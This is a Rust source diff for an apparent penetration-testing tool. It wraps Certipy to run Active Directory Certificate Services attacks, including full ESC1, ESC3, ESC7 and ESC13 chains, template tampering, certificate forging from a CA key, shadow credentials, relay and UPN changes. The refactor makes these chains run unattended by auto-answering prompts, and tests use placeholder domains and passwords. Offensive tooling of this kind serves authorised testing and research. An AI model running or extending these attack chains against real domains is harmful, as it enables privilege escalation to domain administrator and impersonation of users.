@@ -67,6 +67,12 @@ pub(crate) fn unique_run_token() -> String {
 /// `n` aborts.
 const CERTIPY_PROMPT_ANSWERS: &str = "y\ny\ny\ny\ny\n";
 
+fn certipy(subcommand: &str) -> CommandBuilder {
+    CommandBuilder::new("certipy")
+        .arg(subcommand)
+        .stdin(CERTIPY_PROMPT_ANSWERS)
+}
+
 /// Delete every `*.ccache` file in `dir`, or in the process's current working
 /// directory when `dir` is `None`.
 ///
@@ -153,8 +159,7 @@ pub fn build_certipy_find_command(args: &Value) -> Result<Option<CommandBuilder>
 
     let user_at_domain = format!("{username}@{domain}");
 
-    let mut cmd = CommandBuilder::new("certipy")
-        .arg("find")
+    let mut cmd = certipy("find")
         .flag("-u", &user_at_domain)
         .flag("-dc-ip", dc_ip)
         .arg("-text")
@@ -213,8 +218,7 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    let mut cmd = CommandBuilder::new("certipy")
-        .arg("req")
+    let mut cmd = certipy("req")
         .flag("-username", user_at_domain)
         .flag("-ca", ca)
         .flag("-template", template)
@@ -224,7 +228,6 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
         .flag_opt("-upn", upn)
         .flag_opt("-sid", sid)
         .flag_opt("-application-policies", application_policies)
-        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120);
 
     if let Some(ccache) = ticket_path {
@@ -271,12 +274,10 @@ pub fn build_certipy_auth(args: &Value) -> Result<CommandBuilder> {
     let dc_ip = required_str(args, "dc_ip")?;
     let domain = required_str(args, "domain")?;
 
-    let mut cmd = CommandBuilder::new("certipy")
-        .arg("auth")
+    let mut cmd = certipy("auth")
         .flag_visible("-pfx", pfx_path)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
-        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120);
 
     if let Some(passphrase) = crate::acl::shadow_cred_pfx_password(args, pfx_path) {
@@ -325,14 +326,12 @@ pub fn build_certipy_shadow_command(args: &Value) -> Result<CommandBuilder> {
         None => format!("shadow_{target}_{}", unique_run_token()),
     };
 
-    let mut cmd = CommandBuilder::new("certipy")
-        .arg("shadow")
+    let mut cmd = certipy("shadow")
         .arg("auto")
         .flag("-username", user_at_domain)
         .flag("-account", target)
         .flag("-dc-ip", dc_ip)
         .flag("-out", out)
-        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120);
 
     if let Some(ccache) = ticket_path {
@@ -384,8 +383,7 @@ pub fn build_certipy_ca_command(args: &Value) -> Result<CommandBuilder> {
         .and_then(|v| v.as_i64())
         .map(|v| v as i32);
 
-    let mut cmd = CommandBuilder::new("certipy")
-        .arg("ca")
+    let mut cmd = certipy("ca")
         .flag("-username", user_at_domain)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
@@ -420,6 +418,11 @@ pub fn build_certipy_ca_command(args: &Value) -> Result<CommandBuilder> {
 ///                e.g. `administrator@fabrikam.local`)
 /// Optional args: `subject`, `template`, `out` (output PFX path)
 pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
+    build_certipy_forge_command(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_certipy_forge_command(args: &Value) -> Result<CommandBuilder> {
     let ca_pfx = required_str(args, "ca_pfx")?;
     let upn = required_str(args, "upn")?;
     let subject = optional_str(args, "subject");
@@ -433,16 +436,13 @@ pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
         }
     };
 
-    CommandBuilder::new("certipy")
-        .arg("forge")
+    Ok(certipy("forge")
         .flag_visible("-ca-pfx", ca_pfx)
         .flag("-upn", upn)
         .flag_opt("-subject", subject)
         .flag_opt("-template", template)
         .flag("-out", out)
-        .timeout_secs(60)
-        .execute()
-        .await
+        .timeout_secs(60))
 }
 
 /// Retrieve a previously issued certificate by request ID.
@@ -451,6 +451,11 @@ pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
 ///                `request_id`
 /// Optional args: `target` (CA server IP)
 pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
+    build_certipy_retrieve_command(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_certipy_retrieve_command(args: &Value) -> Result<CommandBuilder> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
     let password = required_str(args, "password")?;
@@ -469,8 +474,7 @@ pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
     let ts = unique_run_token();
     let out = format!("cert_retrieve_{request_id}_{ts}");
 
-    CommandBuilder::new("certipy")
-        .arg("req")
+    Ok(certipy("req")
         .flag("-username", user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -478,9 +482,7 @@ pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
         .flag("-dc-ip", dc_ip)
         .flag("-out", out)
         .flag_opt("-target", target)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120))
 }
 
 /// Run the full ESC7 exploitation chain: add officer → request SubCA cert
@@ -511,8 +513,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let user_at_domain = format!("{username}@{domain}");
     let mut outputs = Vec::new();
 
-    let mut step1_cmd = CommandBuilder::new("certipy")
-        .arg("ca")
+    let mut step1_cmd = certipy("ca")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
@@ -527,8 +528,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let ts = unique_run_token();
     let out_name = format!("cert_esc7_{ts}");
 
-    let mut req_cmd = CommandBuilder::new("certipy")
-        .arg("req")
+    let mut req_cmd = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -542,9 +542,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     if let Some(s) = &sid {
         req_cmd = req_cmd.flag("-sid", *s);
     }
-    // Certipy asks "Would you like to save the private key? (y/N)" when the
-    // SubCA request is denied — we need to answer "y" to keep the key for later.
-    let step2 = req_cmd.stdin("y\n").timeout_secs(120).execute().await?;
+    let step2 = req_cmd.timeout_secs(120).execute().await?;
 
     // Parse the request ID from certipy output (e.g., "Request ID is 42")
     let request_id = step2
@@ -577,8 +575,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         });
     };
 
-    let mut step3_cmd = CommandBuilder::new("certipy")
-        .arg("ca")
+    let mut step3_cmd = certipy("ca")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
@@ -590,8 +587,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step3 = step3_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Issue Request", step3));
 
-    let step4 = CommandBuilder::new("certipy")
-        .arg("req")
+    let step4 = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -628,12 +624,10 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
 
     remove_ccache_files(None).await;
 
-    let step5 = CommandBuilder::new("certipy")
-        .arg("auth")
+    let step5 = certipy("auth")
         .flag_visible("-pfx", &pfx_path)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
-        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120)
         .execute()
         .await?;
@@ -671,8 +665,7 @@ pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
     let ca = required_str(args, "ca")?;
     let template = optional_str(args, "template");
 
-    CommandBuilder::new("certipy")
-        .arg("relay")
+    certipy("relay")
         .flag("-target", target)
         .flag("-ca", ca)
         .flag_opt("-template", template)
@@ -685,6 +678,11 @@ pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
 pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
+    build_certipy_template_esc4_command(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_certipy_template_esc4_command(args: &Value) -> Result<CommandBuilder> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
     let password = required_str(args, "password")?;
@@ -693,16 +691,13 @@ pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    CommandBuilder::new("certipy")
-        .arg("template")
+    Ok(certipy("template")
         .flag("-username", user_at_domain)
         .flag("-password", password)
         .flag("-template", template)
         .flag("-dc-ip", dc_ip)
         .arg("-save-old")
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120))
 }
 
 /// Modify a target account's `userPrincipalName` via `certipy account update`.
@@ -726,8 +721,7 @@ pub async fn certipy_account_update(args: &Value) -> Result<ToolOutput> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    CommandBuilder::new("certipy")
-        .arg("account")
+    certipy("account")
         .arg("update")
         .flag("-username", user_at_domain)
         .flag("-password", password)
@@ -852,8 +846,7 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     let target_out = format!("target_{ts}");
     let target_pfx = format!("{target_out}.pfx");
 
-    let agent_output = CommandBuilder::new("certipy")
-        .arg("req")
+    let agent_output = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -891,8 +884,7 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     // literal `\` on the command line.
     let nt_domain = on_behalf_nt_domain(args, domain);
     let on_behalf_target = format!("{nt_domain}\\{on_behalf_of}");
-    let request_output = CommandBuilder::new("certipy")
-        .arg("req")
+    let request_output = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -935,13 +927,11 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     // avoid the interactive overwrite prompt that kills non-interactive
     // runs (matches what `certipy_auth` does at module level).
     remove_ccache_files(Some(&cwd)).await;
-    let auth_output = CommandBuilder::new("certipy")
-        .arg("auth")
+    let auth_output = certipy("auth")
         .flag_visible("-pfx", &target_pfx)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
         .current_dir(&cwd)
-        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(180)
         .execute()
         .await?;
@@ -1002,8 +992,7 @@ pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
 
     // Plain enrollment — NO `-upn`/`-sid`. The issuance-policy OID on the template
     // is what grants the privileged group at auth time.
-    let request_output = CommandBuilder::new("certipy")
-        .arg("req")
+    let request_output = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -1034,14 +1023,12 @@ pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
     let mut auth_attempts = 0;
     loop {
         auth_attempts += 1;
-        auth_output = CommandBuilder::new("certipy")
-            .arg("auth")
+        auth_output = certipy("auth")
             .flag_visible("-pfx", &pfx_name)
             .flag("-dc-ip", dc_ip)
             .flag("-domain", domain)
             .flag("-username", username)
             .current_dir(&cwd)
-            .stdin(CERTIPY_PROMPT_ANSWERS)
             .timeout_secs(120)
             .execute()
             .await?;
@@ -1155,8 +1142,7 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     let pfx_name = format!("{out_name}.pfx");
 
     // KB5014754 strict mapping requires -upn + -sid on the request.
-    let request_output = CommandBuilder::new("certipy")
-        .arg("req")
+    let request_output = certipy("req")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-ca", ca)
@@ -1208,14 +1194,12 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     let mut auth_attempts = 0;
     loop {
         auth_attempts += 1;
-        auth_output = CommandBuilder::new("certipy")
-            .arg("auth")
+        auth_output = certipy("auth")
             .flag_visible("-pfx", &pfx_name)
             .flag("-dc-ip", dc_ip)
             .flag("-domain", domain)
             .flag("-username", auth_user)
             .current_dir(&cwd)
-            .stdin(CERTIPY_PROMPT_ANSWERS)
             .timeout_secs(120)
             .execute()
             .await?;
@@ -1404,8 +1388,7 @@ pub async fn certipy_find_anon(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
 
-    CommandBuilder::new("certipy")
-        .arg("find")
+    certipy("find")
         .flag("-u", format!("@{domain}"))
         .flag("-p", "")
         .flag("-target-ip", dc_ip)
@@ -1723,7 +1706,38 @@ mod tests {
             "dc_ip": "192.168.58.10"
         }))
         .unwrap();
-        for cmd in [auth, req, shadow] {
+        let retrieve = super::build_certipy_retrieve_command(&json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "contoso-CA01-CA",
+            "dc_ip": "192.168.58.10",
+            "request_id": 3348
+        }))
+        .unwrap();
+        let forge = super::build_certipy_forge_command(&json!({
+            "ca_pfx": "/tmp/contoso-CA01-CA.pfx",
+            "upn": "admin@contoso.local"
+        }))
+        .unwrap();
+        let template = super::build_certipy_template_esc4_command(&json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "template": "User",
+            "dc_ip": "192.168.58.10"
+        }))
+        .unwrap();
+        let ca = super::build_certipy_ca_command(&json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "ca": "contoso-CA01-CA",
+            "backup": true
+        }))
+        .unwrap();
+        for cmd in [auth, req, shadow, retrieve, forge, template, ca] {
             assert_eq!(
                 cmd.stdin_for_test(),
                 Some(super::CERTIPY_PROMPT_ANSWERS),
@@ -1732,6 +1746,47 @@ mod tests {
                  the run down after the attack has already landed"
             );
         }
+    }
+
+    #[test]
+    fn no_certipy_child_is_spawned_outside_the_prompt_answering_constructor() {
+        let source = include_str!("adcs.rs");
+        let raw = source
+            .lines()
+            .filter(|line| line.contains("CommandBuilder::new(\"certipy\")"))
+            .count();
+        assert_eq!(
+            raw, 1,
+            "every certipy invocation must go through `certipy()`; a bare \
+             CommandBuilder inherits the null stdin that turns certipy's \
+             overwrite prompt into an EOFError and throws away an issued \
+             certificate"
+        );
+    }
+
+    #[test]
+    fn certipy_retrieve_keeps_the_request_id_and_a_fresh_stem() {
+        let args = json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "contoso-CA01-CA",
+            "dc_ip": "192.168.58.10",
+            "request_id": 3348
+        });
+        let out_of = |cmd: super::CommandBuilder| {
+            let argv = cmd.args_for_test();
+            let idx = argv.iter().position(|a| a == "-out").unwrap();
+            argv[idx + 1].clone()
+        };
+        let first = out_of(super::build_certipy_retrieve_command(&args).unwrap());
+        let second = out_of(super::build_certipy_retrieve_command(&args).unwrap());
+        assert!(first.contains("3348"), "got {first}");
+        assert_ne!(
+            first, second,
+            "two retrievals of one pending request must not race onto a single \
+             file — the loser answers an overwrite prompt it cannot see"
+        );
     }
 
     #[test]
